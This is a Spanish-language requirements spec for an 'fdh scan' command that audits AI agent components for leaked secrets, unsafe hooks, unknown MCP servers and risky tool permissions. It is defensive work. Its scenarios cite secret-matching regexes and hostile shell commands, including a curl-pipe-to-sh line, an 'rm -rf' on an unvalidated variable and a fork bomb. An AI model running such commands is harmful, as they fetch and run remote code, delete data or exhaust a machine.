## ADDED Requirements

### Requirement: Comando `fdh scan` audita componentes

`fdh` SHALL proveer un comando `fdh scan [path...]` que audite skills/rules/agents/hooks (un componente, un directorio del hub o un consumer install) emitiendo hallazgos clasificados por severidad (`info | warning | error`). El exit code SHALL ser 0 si no hay hallazgos `error`, distinto de 0 si hay al menos uno.

#### Scenario: Scan sin hallazgos

- **WHEN** `fdh scan skills/design-system/` corre y no detecta problemas
- **THEN** `fdh` imprime "no findings" y sale con código cero

#### Scenario: Scan con hallazgo de error

- **WHEN** `fdh scan agents/leaky-agent/` detecta una API key en el system prompt
- **THEN** `fdh` imprime el hallazgo con archivo, línea, regla violada y severidad `error`, y sale con código distinto de cero

#### Scenario: Scan en CI sobre cambios del PR

- **WHEN** CI corre `fdh scan --diff origin/main` en un PR
- **THEN** `fdh` audita sólo los componentes tocados por el diff y reporta hallazgos sólo de esos

### Requirement: Detección de secrets en cualquier componente

`fdh scan` SHALL detectar patrones de secrets comunes en el contenido de skills/rules/agents/hooks: API keys genéricas (regex `[A-Z0-9_]{32,}` con contexto), AWS access keys (`AKIA[0-9A-Z]{16}`), GitHub tokens (`gh[pousr]_[A-Za-z0-9]{36,}`), JWTs (`eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`), URLs con credenciales embebidas (`https?://[^:]+:[^@]+@`), y variables de entorno con valores hardcodeados (`(AWS|API|SECRET|TOKEN)_[A-Z_]*=\S{8,}`).

#### Scenario: GitHub token detectado

- **WHEN** un componente contiene la línea `token: "ghp_abcdefghijklmnopqrstuvwxyz1234567890"`
- **THEN** `fdh scan` reporta hallazgo `error` con regla `secret/github-token` y la línea ofuscada en el output

#### Scenario: False positive permitido vía allowlist

- **WHEN** un componente contiene un literal claramente seguro y declara `# fdh:allow secret/github-token` en línea o en `.fdh-scan-allowlist`
- **THEN** `fdh scan` no reporta hallazgo para esa coincidencia

### Requirement: Validación de hooks contra inyección de comandos

`fdh scan` SHALL validar archivos `hook.json` revisando el campo `command` para: uso de shell builtins peligrosos sin quoting (`rm -rf`, `eval`, `:(){:|:&};:`), interpolación de variables del entorno sin escape (`$USER_INPUT` desnudo), o pipes a `sh`/`bash` desde fuentes externas (`curl ... | sh`).

#### Scenario: Hook con curl | sh

- **WHEN** un `hook.json` declara `command: "curl -fsSL http://x | sh"`
- **THEN** `fdh scan` reporta hallazgo `error` con regla `hook/curl-pipe-sh`

#### Scenario: Hook con interpolación insegura

- **WHEN** un `hook.json` declara `command: "rm -rf $PROJECT_DIR/build"` donde `PROJECT_DIR` no es validado
- **THEN** `fdh scan` reporta hallazgo `warning` con regla `hook/unquoted-var` y sugerencia de quoting

### Requirement: Perfilado de riesgo de MCPs declarados

`fdh scan` SHALL leer cualquier referencia a MCP servers que un componente declare (en agent configs, en hooks, en skill metadata) y SHALL clasificar el riesgo según una lista interna: MCPs corporativos Falabella = `info`, MCPs OSS conocidos = `warning`, MCPs no listados = `error` (requiere allowlist explícita).

#### Scenario: MCP corporativo

- **WHEN** un componente declara `mcp_servers: [falabella-internal-db]` y ese nombre está en la lista corporativa
- **THEN** `fdh scan` reporta `info` informativo

#### Scenario: MCP desconocido

- **WHEN** un componente declara `mcp_servers: [random-mcp-from-internet]` no listado
- **THEN** `fdh scan` reporta `error` con regla `mcp/unknown-source` y sugiere agregar a allowlist explícita si es legítimo

### Requirement: Auditoría de permisos en agent configs

`fdh scan` SHALL revisar el campo `tools` de cada `AGENT.md` y SHALL clasificar combinaciones de riesgo: `Bash` sin restricciones de comandos = `warning`; `Write` + `Bash` juntos sin `--ask-confirmation` = `warning`; tools no soportados o desconocidos = `error`.

#### Scenario: Agent con Bash sin restricciones

- **WHEN** un `AGENT.md` declara `tools: [Bash]` sin restricciones explícitas en el system prompt
- **THEN** `fdh scan` reporta `warning` con regla `agent/unrestricted-bash` y sugiere agregar restricciones

#### Scenario: Tool desconocido

- **WHEN** un `AGENT.md` declara `tools: [Read, NotARealTool]`
- **THEN** `fdh scan` reporta `error` con regla `agent/unknown-tool`

### Requirement: Implementación rule-based, evolución futura adversarial

La implementación v1 de `fdh scan` SHALL ser rule-based deterministic — sin LLMs en el path crítico. La evolución a un pipeline adversarial multi-agente (red-team / defender / auditor) SHALL ocurrir en un change futuro `evolve-scan-to-adversarial`, manteniendo el mismo contrato CLI.

#### Scenario: Determinismo

- **WHEN** `fdh scan` corre dos veces sobre el mismo input
- **THEN** la salida (excepto timestamps en logs) es byte-idéntica

#### Scenario: Sin dependencia LLM

- **WHEN** `fdh scan` corre en una máquina sin conectividad a APIs de LLM
- **THEN** completa exitosamente sin warnings sobre LLMs faltantes
